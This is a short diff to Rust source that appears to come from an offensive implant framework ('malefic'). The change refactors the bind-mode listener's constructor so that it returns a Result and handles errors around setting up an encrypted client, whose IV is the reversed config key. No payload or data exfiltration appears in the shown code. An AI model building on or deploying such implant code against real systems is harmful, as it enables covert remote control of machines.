@@ -1,6 +1,6 @@
 use malefic_core::config;
 use malefic_core::transport::{Client, Transport, Listener, ListenerExt};
-use malefic_proto::crypto::{new_cryptor};
+use malefic_proto::crypto::new_cryptor;
 use malefic_helper::debug;
 use malefic_proto::marshal_one;
 use crate::stub::{MaleficStub};
@@ -14,7 +14,7 @@ pub struct MaleficBind {
 }
 
 impl MaleficBind {
-    pub async fn new(channel: MaleficChannel) -> Self {
+    pub async fn new(channel: MaleficChannel) -> Result<Self, Box<dyn std::error::Error>> {
         let stub = MaleficStub::new([0; 4], channel);
         let addr = config::URLS.first().unwrap().clone();
 
@@ -23,15 +23,22 @@ impl MaleficBind {
             debug!("Failed to bind listener: {:#?}", e);
             panic!("Failed to bind listener");
         }).unwrap();
-        
+
         debug!("Listening on {}", addr);
         let iv: Vec<u8> = config::KEY.to_vec().iter().rev().cloned().collect();
-        MaleficBind {
-            client: Client::new(new_cryptor(config::KEY.to_vec(), iv)),
+
+        let client = Client::new(new_cryptor(config::KEY.to_vec(), iv))
+            .map_err(|e| {
+                debug!("[bind] Failed to initialize client: {}", e);
+                e
+            })?;
+
+        Ok(MaleficBind {
+            client,
             stub,
             listener,
             initialize: false
-        }
+        })
     }
     
     pub async fn init(&mut self, transport: Transport) -> anyhow::Result<()> {
